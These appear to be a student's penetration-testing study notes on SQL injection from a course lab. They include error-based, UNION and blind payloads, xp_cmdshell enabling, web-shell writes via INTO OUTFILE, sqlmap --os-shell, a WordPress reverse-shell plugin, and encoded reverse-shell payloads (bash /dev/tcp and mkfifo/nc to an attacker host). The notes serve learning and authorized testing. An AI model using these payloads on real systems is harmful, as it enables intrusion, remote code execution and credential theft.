# 10. SQL Injection Attacks
SQL vulnerabilities typically allow the attacker to extend the original application query to include database tables that would normally be inaccessible

## 10.1. SQL Theory and Databases
no notes

### 10.1.1. SQL Theory Refresher
User interact with front end - HTML, CSS, and JavaScript.

Front end sends data to backend - PHP, Java, and Python.

Back end interact with data residing in a database - MySQL, Microsoft SQL Server, PostgreSQL, and Oracle 

The $_Post variable lets you extract data from a post request.
$uname = $_POST['uname'];
$passwd =$_POST['password'];

It appears to be stored in a map where the variable uname stores the username key

### 10.1.2. DB Types and Characteristics (focus on mysql and mssql)
MariaDB is a fork of Mysql, and is open-source

default mysql port is 3306

mysql -u root -p'root' -h 192.168.50.16 -P 3306
select version();
select system_user(); -- note root in db is only for db not for entire system
show databases;

example of how a query to get a password might look -- in this example the password is stored as a Caching-Sha-256 hash
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';

Once you get the hash you may be able to crack it

MSQL part

Windows has SQL command that lets queries be run via CMD prompt or remotely from another machine

Impacket has a tool for interacting with a protocol adapted by MSSQL called Tabular Data Stream (this is the name of the protocol not the tool)

The tools name is called impacket-mssqlclient tool

impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
-windows-auth: forces Windows authentication instead of Kerberos
Administrator: the username
Lab123: The password
192...18: the host

SELECT @@version;
NOTE: using sqlcmd "SELECT @@version;" must be followed by GO on a seperate line. However TDS protocol does not require this. Since Impacket uses TDS, the command above does not have this!

SELECT name FROM sys.databases;

Since master, tempdb, model, and msdb are default databases, we want to explore the custom offsec database because it might contain data belonging to our target

SELECT * FROM offsec.information_schema.tables;

somethings that I think are worth noting:
mysql user name was queried from mysql.users which seems like a default... for mssql, we intentionally skip the default databases.
in mysql it seems like there is one information_schema which is its own database. in mssql, it seems like each database has their own information schema within.
I am not sure if this is a common occurance or just this particular example. Something to keep in the back of the mind.
There seems to be an inconsistancy on which route they pursue and I can't tell if its to give a more holistic view, or specifically for the different database types.

update: A few google searches show that mysql.users is shown to be where users grant permissions are stored

https://learnsql.com/blog/sql-server-cheat-sheet/ -- resource for navigating mssql.
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server is pretty good as well

select * from sys.databases;
use <database>
select * from sys.tables --while in current database

get all users
SELECT * FROM sysusers
or
select * from sys.database_principals;

### 10.2.1. Identifying SQLi via Error-based Payloads
$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";

offsec' OR 1=1 -- //

SQL injection inband = vulnerable application provides result of query with the application returned value
Most production web apps do not show error messages as showing these messages is considered a security flaw

' or 1=1 in (select @@version) -- //

MySQL accepts both version() and @@version statements.

dump information from users table
' OR 1=1 in (SELECT * FROM users) -- //

There was an error from trying to select too many columns. This is because we used * in the query which grabs every column.

select only password from users

' or 1=1 in (SELECT password FROM users) -- //
This returned Truncated incorrect double values... those were the hashes

You can use "where" to narrow which account has which hash while still abiding the 1 column limitation in this example
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

### 10.2.2 UNION-based Payloads

Whenever we're dealing with in-band SQL injections and the result of the query is displayed along with the application-returned value, we should also test for UNION-based SQL injections.

2 conditions needed for union sqli attacks
The injected UNION query has to include the same number of columns as the original query.
The data types need to be compatible between each column.

$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
. is the concat operator in sql % is the wild card that matches 0 or more characters

name LIKE '".$_POST["search_input"]."%'"; -- this returns any value that has input from post request and a wildcard of characters (specified by the %)

Figure out how many columns are needed. increment 1 until you hit an error
' ORDER BY 1-- //

replace un-needed extra columns with null
%' UNION SELECT database(), user(), @@version, null, null -- //

Since we want to retrieve all the data from the customers table, we'll use the percentage sign followed by a single quote to close the search parameter. 

The query statement has a certain layout of data types... etc column 1 is integer, 2 is string, etc. We can try shifting
the nulls and sqli data to get what we need like so

' UNION SELECT null, null, database(), user(), @@version  -- //
notice the placement of nulls, and database here versus the statement above

This web application explicitly omits the output from the first column because IDs are not usually useful information for end users.


' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
see other tables in current database

' UNION SELECT null, username, password, description, null FROM users -- //
attempt to dump passwords
extra reading

### 10.2.3. Blind SQL Injections

blind SQL injections describe scenarios in which database responses are never returned and behavior is inferred

Although "boolean-based" might not seem like a blind SQLi variant, the output used to infer results comes from the web application, not the database itself.

Boolean Based
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
' AND 1=1 -- //
Only returns values if the user is present in the database

time based
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
if user does exist, sleep for 3 seconds.

### 10.3.1

MSSQL has a function called xp_cmdshell to pass strings to cmd for execution
- This is disabled by default

Called with EXECUTE keyword instead of select

enable xp_cmdshell by simulating an SQL injection via the impacket-mssqlclient tool

impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

EXECUTE sp_configure 'show advanced options', 1;

RECONFIGURE;

EXECUTE sp_configure 'xp_cmdshell', 1;

RECONFIGURE;

Execute commands: EXECUTE xp_cmdshell 'whoami';

SELECt INTO_OUTFILE lets you write files to webserver
For this to work, the file location must be writable to the OS user running the database software.

' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

which results in <? system($_REQUEST['cmd']); ?>

using this payload there was a fatal error due to return type... however the shell was still uploaded.

www-data is a common user associated with web servers on linux

10.3.2. Automating the Attack
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
-p: specify parameter (this is for get, how would you do this for a post? Does this question even make sense?)

Due to its high volume of traffic, sqlmap should not be used as a first choice tool during assignments that require staying under the radar.

sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
--dump: Dump the entire database

SQL Map get a shell:
1) Intercept a post request via burp and save as text file on attack box

Next, we can invoke sqlmap with the -r parameter, using our file containing the POST request as an argument. 
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"


capstones
wordpress vulnerable plugins (Note -- this did not catch perfect-survey 1.5.1 which has a SQLI POC on exploitdb and wpscan itself... This option should be skipped?)
wpscan -e vp --url alvida-eatery.org

wordpress all plugins
wpscan -e ap --url alvida-eatery.org


Hashcat find examples of hash types
https://hashcat.net/wiki/doku.php?id=example_hashes

Found value=\"$P$BINTaLa8QLMqeXbQtzT2Qfizm2P\/nI0\"
from that the actual hash is

$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0 (the two \'s were escape characters)

hashcat -O -m 400 -a 0 -o cracked.txt hash.txt rockyou.txt

note rockyou.txt is generally zipped
tar -xsvf rockyou.txt.tar.gz

Word press plugins :
plugins must be a .php file which is then zipped!

example that I used

note: Only the plugin : name is needed 
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.215/443 0>&1'");
?>

zip up that file, I used

zip evil evil

open a netcat listener using nc -lvnp 443

uploading and activating the plugin launches the connection! navigating to the page is not necessary!

maybe useful urls:?
/wp-admin/plugins.php?plugin_status=all&paged=1&s -- list all plugins

The plugin was uploaded to /var/www/wordpress/wp-content/plugins/evil
with the payload at /var/www/wordpress/wp-content/plugins/evil/evil.php

another example is if I wanted to access wpforms lite readme.txt. WP Plugins generally put a dash wherever a space is
http://alvida-eatery.org/wp-content/plugins/wpforms-lite/readme.txt

some examples of mysql payloads that I was able to use
1)
attempt to write into outfile for 6 query columns -- verify by navigating to 10.x.x.x/x.php

SOMEPARAMETER=UNION+SELECT+null,null,null,null,null,null+into+outfile+%22/var/www/html/x.php%22+--+//

2)
tried injecting "<?php system($_GET['cmd']);?>" into one of the fields
in that field I url encoded every character and got the following payload

SOMEPARAMETER='UNION+SELECT+null,%22%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%27%63%6d%64%27%5d%29%3b%3f%3e%22,null,null,null,null+into+outfile+%22/var/www/html/x4.php%22+--+//

Verified RCE by doing the following http://10.x.x.x/x4.php?cmd=whoami

3)
to get shell I did the following
I remembered the PHP uses bourne as a shell so I used the following reverse shell payload

bash -c "bash -i >& /dev/tcp/ATTACKERIP/4444 0>&1"

I threw that into burpsuite and url encoded everything
opened a listener using nc -lvnp 4444
Then I used the following request url to get shell

http://10.x.x.x/x4.php?cmd=%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%34%35%2e%32%34%39%2f%34%34%34%34%20%30%3e%26%31%22

4)
a) send to victim
payload
';CREATE TABLE shell(output text);+--+//

entire parameter with payload encoded
SOMEPARAMETER='%3bCREATE+TABLE+shell(output+text)%3b+--+//
note: seems like encoding ;'s has no effect on payload functionality.

b) open nc listener on box
nc -lvnp 1234

c) start remote session
payload
';COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKERIP> 1234 >/tmp/f';+--+//

entire parameter with payload encoded
SOMEPARAMETER=';COPY+shell+FROM+PROGRAM+'rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+<ATTACKERIP>+1234+>/tmp/f'%3b+--+//&gender=Male&email=test%40test.com

Hackers Note: Beware copy pasting payloads from blogs. Sometimes they use infuriatingly use ’ instead of ' for quotes which breaks the payload

Also testing shows that encoding the cut-off +--+// breaks the payload as well

from this lab I learned the following
1) you can just close out a statement using ';'
2) a union attack can potentially be converted into straight RCE by using 1). Remember to close out statements with a ';' at the end as well.
3) sometimes payloads have to be executed one line at a time
4) You can make a pipe using mkfifo. This creates a special file that only lives in the RAM not on storage
5) You can write and read from these pipes similar to a regular file however once it is read, the data is gone
6) +--+// may be to stay unencoded for some payloads to work. In this lab, payloads would not work at all with that part encoded
7) when copy pasting payloads, make sure no non-standard characters are being used for a fancy font. In this example medium used ’ instead of '. 
Though to be honest, this payload is straight from the PayloadAllThings repo, and it does not have this potential issue. 
7.5) get payloads from the source, not some hack writing a medium blog.
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  
Extra Reading  
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  

10.3.2. Automating the Attack
http://sqlmap.org/


10.3.1. Manual Code Execution
https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15
- xp command shell output is returned as rows of text. 
- double quotes can only be used for paths. everything else is single quotes.
- return code 0 = pass 1 = fail
- The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account.


https://dev.mysql.com/doc/refman/8.0/en/select-into.html
enables a query result to be stored in variables or written to a file:

https://en.wikipedia.org/wiki/Web_shell

10.2.2 UNION-based Payloads
https://www.w3schools.com/sql/sql_union.asp 
https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html
https://en.wikipedia.org/wiki/MD5

10.1.2. DB Types and Characteristics
https://www.mysql.com/
  mysql main website

https://mariadb.org/
  open source fork of mysql

https://dev.mysql.com/doc/refman/8.0/en/caching-sha2-pluggable-authentication.html
  Mysql hash are implemented via plugins

http://www.microsoft.com/sqlserver
  page did not load

https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility
  lets you run Transact-SQL statements via
  Command prompt, Windows Scripts
https://github.com/SecureAuthCorp/impacket

https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/893fcc7e-8a39-4b3c-815a-773b7b982c50/
  TDS is used for transfer of requests from Clients and Databases

 

10. SQL Injection Attacks
https://owasp.org/www-project-top-ten/
https://owasp.org/Top10/A03_2021-Injection/

 
